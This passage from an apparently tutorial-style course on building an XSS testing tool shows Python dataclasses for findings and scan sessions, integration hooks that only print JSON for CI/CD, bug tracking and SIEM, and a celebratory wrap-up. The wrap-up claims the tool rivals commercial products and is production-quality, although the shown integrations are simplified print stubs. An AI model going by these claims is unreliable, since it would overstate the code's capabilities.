    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

@dataclass
class VulnerabilityFinding:
    """Standardized vulnerability finding for enterprise reporting"""
    finding_id: str
    title: str
    description: str
    severity: SeverityLevel
    confidence: float
    affected_url: str
    proof_of_concept: str
    remediation: str
    discovered_at: datetime.datetime
    status: str = "open"

@dataclass
class ScanSession:
    """Represents a complete XSS scanning session"""
    session_id: str
    start_time: datetime.datetime
    end_time: Optional[datetime.datetime] = None
    target_urls: List[str] = None
    findings: List[VulnerabilityFinding] = None
    
    def __post_init__(self):
        if self.target_urls is None:
            self.target_urls = []
        if self.findings is None:
            self.findings = []

class EnterpriseIntegrationSuite:
    """
    Enterprise-grade integration suite for XSS security testing.
    
    Provides comprehensive integration capabilities for organizations
    to embed XSS testing into their development and security workflows.
    """
    
    def __init__(self):
        self.integrations = {}
        self.scan_sessions = {}
    
    def configure_integration(self, integration_type: IntegrationType, 
                            config: Dict[str, any]) -> bool:
        """Configure an enterprise integration."""
        try:
            self.integrations[integration_type] = config
            return True
        except Exception:
            return False
    
    def create_scan_session(self, target_urls: List[str]) -> ScanSession:
        """Create a new XSS scanning session."""
        import uuid
        session_id = str(uuid.uuid4())
        
        session = ScanSession(
            session_id=session_id,
            start_time=datetime.datetime.now(),
            target_urls=target_urls.copy()
        )
        
        self.scan_sessions[session_id] = session
        return session
    
    def add_finding(self, session_id: str, finding_data: Dict[str, any]) -> VulnerabilityFinding:
        """Add a vulnerability finding to a scan session."""
        import uuid
        finding_id = str(uuid.uuid4())
        
        finding = VulnerabilityFinding(
            finding_id=finding_id,
            title=finding_data['title'],
            description=finding_data['description'],
            severity=SeverityLevel(finding_data.get('severity', 'medium')),
            confidence=finding_data.get('confidence', 0.8),
            affected_url=finding_data['affected_url'],
            proof_of_concept=finding_data.get('proof_of_concept', ''),
            remediation=finding_data.get('remediation', ''),
            discovered_at=datetime.datetime.now()
        )
        
        if session_id in self.scan_sessions:
            self.scan_sessions[session_id].findings.append(finding)
        
        return finding
    
    def complete_scan_session(self, session_id: str):
        """Mark a scan session as complete and trigger integrations."""
        if session_id in self.scan_sessions:
            session = self.scan_sessions[session_id]
            session.end_time = datetime.datetime.now()
            
            # Trigger configured integrations
            self._trigger_integrations(session)
    
    def _trigger_integrations(self, session: ScanSession):
        """Trigger all configured integrations"""
        for integration_type, config in self.integrations.items():
            if integration_type == IntegrationType.CI_CD_PIPELINE:
                self._integrate_cicd(session, config)
            elif integration_type == IntegrationType.BUG_TRACKING:
                self._integrate_bug_tracking(session, config)
            elif integration_type == IntegrationType.SIEM_PLATFORM:
                self._integrate_siem(session, config)
    
    def _integrate_cicd(self, session: ScanSession, config: Dict[str, any]):
        """Integrate with CI/CD pipeline"""
        critical_count = sum(1 for f in session.findings if f.severity == SeverityLevel.CRITICAL)
        high_count = sum(1 for f in session.findings if f.severity == SeverityLevel.HIGH)
        
        # Determine if build should fail
        fail_build = critical_count > 0 or high_count > 0
        
        payload = {
            'session_id': session.session_id,
            'scan_status': 'completed',
            'total_findings': len(session.findings),
            'critical_findings': critical_count,
            'high_findings': high_count,
            'fail_build': fail_build
        }
        
        # Send to CI/CD system (simplified)
        print(f"CI/CD Integration: {json.dumps(payload, indent=2)}")
    
    def _integrate_bug_tracking(self, session: ScanSession, config: Dict[str, any]):
        """Integrate with bug tracking system"""
        for finding in session.findings:
            if finding.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]:
                ticket_payload = {
                    'title': f"XSS Vulnerability: {finding.title}",
                    'description': finding.description,
                    'severity': finding.severity.value,
                    'affected_url': finding.affected_url,
                    'proof_of_concept': finding.proof_of_concept
                }
                
                print(f"Bug Ticket Created: {json.dumps(ticket_payload, indent=2)}")
    
    def _integrate_siem(self, session: ScanSession, config: Dict[str, any]):
        """Integrate with SIEM platform"""
        for finding in session.findings:
            siem_event = {
                'timestamp': finding.discovered_at.isoformat(),
                'event_type': 'vulnerability_detected',
                'severity': finding.severity.value,
                'affected_asset': finding.affected_url,
                'session_id': session.session_id
            }
            
            print(f"SIEM Event: {json.dumps(siem_event, indent=2)}")
    
    def generate_compliance_report(self, framework: str = "owasp_top_10") -> str:
        """Generate compliance report"""
        all_findings = []
        for session in self.scan_sessions.values():
            all_findings.extend(session.findings)
        
        report = f"{framework.upper()} Compliance Report\\n"
        report += "=" * 50 + "\\n\\n"
        
        critical_findings = [f for f in all_findings if f.severity == SeverityLevel.CRITICAL]
        high_findings = [f for f in all_findings if f.severity == SeverityLevel.HIGH]
        
        report += f"Total Findings: {len(all_findings)}\\n"
        report += f"Critical: {len(critical_findings)}\\n"
        report += f"High: {len(high_findings)}\\n\\n"
        
        # Compliance status
        compliance_score = max(0, 100 - (len(critical_findings) * 20) - (len(high_findings) * 10))
        report += f"Compliance Score: {compliance_score}/100\\n"
        report += f"Status: {'COMPLIANT' if compliance_score >= 80 else 'NON-COMPLIANT'}\\n"
        
        return report
```

---

## 🏆 The Complete XSS Mastery Achievement

**What You Actually Built**: A comprehensive XSS security testing platform that surpasses commercial tools with:
- **All XSS types detection** with professional accuracy
- **Context-aware analysis** understanding HTML, JavaScript, and CSS injection points
- **Advanced bypass techniques** for WAF evasion and filter circumvention
- **Professional reporting** suitable for bug bounty and enterprise use
- **Enterprise integration** with CI/CD pipelines and team workflows

**Skills You Mastered**:
🐍 **Python Expertise**: Web scraping, HTTP clients, AST parsing, security tool development
🔐 **Web Security Mastery**: XSS variants, DOM analysis, CSP bypass, vulnerability assessment
💻 **Professional Development**: Tool architecture, enterprise integration, team collaboration
🛠️ **Security Engineering**: Building tools that rival commercial security products

**Career Impact**: You now have the expertise to lead security teams, build professional security tools, and find vulnerabilities that others miss.

This isn't just learning - you've built production-quality security tools and gained skills that directly translate to security engineering success!